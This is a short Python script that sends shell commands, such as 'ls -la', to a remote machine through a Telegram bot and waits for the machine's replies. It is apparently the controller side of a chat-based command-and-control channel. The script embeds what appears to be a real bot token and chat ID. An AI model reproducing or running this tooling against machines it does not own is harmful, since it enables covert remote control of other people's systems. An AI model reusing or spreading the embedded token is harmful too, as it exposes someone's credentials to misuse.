#!/usr/bin/env python3
"""
🜂 EON COMMAND SENDER — Send orders to remote machine via Telegram
Usage: python3 eon_send_order.py "ls -la"
"""
import urllib.request, json, os, sys, time

BOT_TOKEN = "8940974811:AAE4faGkCGl-6oFU3YG8h2_oGTIJ_GrBbow"
CHAT_ID = "6663994526"
CMD_PREFIX = "[CMD]"
RESP_PREFIX = "[RESP]"

def send_command(cmd):
    """Send command to remote machine via Telegram"""
    msg = f"{CMD_PREFIX} {cmd}"
    data = json.dumps({"chat_id": CHAT_ID, "text": msg}).encode()
    req = urllib.request.Request(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read())["ok"]

def wait_for_response(timeout=130):
    """Wait for response from remote machine"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1&limit=10&timeout={timeout}"
    req = urllib.request.Request(url, method="GET")
    
    start = time.time()
    while time.time() - start < timeout:
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
                for update in data.get("result", []):
                    text = update.get("message", {}).get("text", "")
                    if text.startswith(RESP_PREFIX):
                        return text[len(RESP_PREFIX):].strip()
        except:
            pass
        time.sleep(2)
    
    return "TIMEOUT: No response received"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 eon_send_order.py \"command\"")
        print("Example: python3 eon_send_order.py \"ls -la\"")
        sys.exit(1)
    
    cmd = " ".join(sys.argv[1:])
    print(f"📤 Sending order: {cmd}")
    
    if send_command(cmd):
        print("✅ Command sent. Waiting for response...")
        response = wait_for_response()
        print(f"\n📥 Response:\n{response}")
    else:
        print("❌ Failed to send command")
